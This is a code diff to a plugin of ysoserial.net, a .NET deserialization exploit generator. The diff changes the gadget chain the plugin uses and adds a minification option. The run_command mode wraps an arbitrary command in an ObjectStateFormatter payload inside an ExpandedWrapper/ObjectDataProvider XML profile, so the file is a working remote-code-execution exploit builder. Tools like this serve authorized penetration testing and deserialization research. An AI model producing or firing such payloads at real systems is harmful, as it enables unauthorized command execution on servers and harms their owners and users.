@@ -2,6 +2,7 @@
 using NDesk.Options;
 using System;
 using ysoserial.Generators;
+using ysoserial.Helpers;
 
 namespace ysoserial.Plugins
 {
@@ -9,10 +10,10 @@ namespace ysoserial.Plugins
     {
         static string mode = "";
         static string path = "";
-        static string file = "";
         static string url = "";
         static string command = "";
-        static Boolean minify = false;
+        static bool minify = false;
+        static bool useSimpleType = true;
 
         static OptionSet options = new OptionSet()
             {
@@ -21,6 +22,7 @@ namespace ysoserial.Plugins
                 {"u|url=", "the url to fetch the file from in write_file mode.", v => url = v },
                 {"f|file=", "the file to read in read_file mode or the file to write to in write_file_mode.", v => path = v },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
+                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
 
         public string Name()
@@ -45,10 +47,14 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
             }
             catch (OptionException e)
             {
@@ -69,7 +75,7 @@ namespace ysoserial.Plugins
             }
             else if (mode == "run_command" && command != "")
             {
-                byte[] osf = (byte[]) new TypeConfuseDelegateGenerator().Generate(command, "ObjectStateFormatter", false, minify);
+                byte[] osf = (byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("ObjectStateFormatter", inputArgs);
                 string b64encoded = Convert.ToBase64String(osf);
                 string prefix = @"<profile><item key=""key"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type=""ObjectStateFormatter"" xmlns:p3=""http://www.w3.org/2001/XMLSchema-instance"" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1=""http://www.w3.org/2001/XMLSchema"" p5:type=""q1:string"" xmlns:p5=""http://www.w3.org/2001/XMLSchema-instance"">";
                 string suffix = @"</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>";
@@ -85,7 +91,7 @@ namespace ysoserial.Plugins
 
             if (minify)
             {
-                payload = Helpers.XMLMinifier.Minify(payload, null, null);
+                payload = XMLMinifier.Minify(payload, null, null);
             }
 
             return payload;
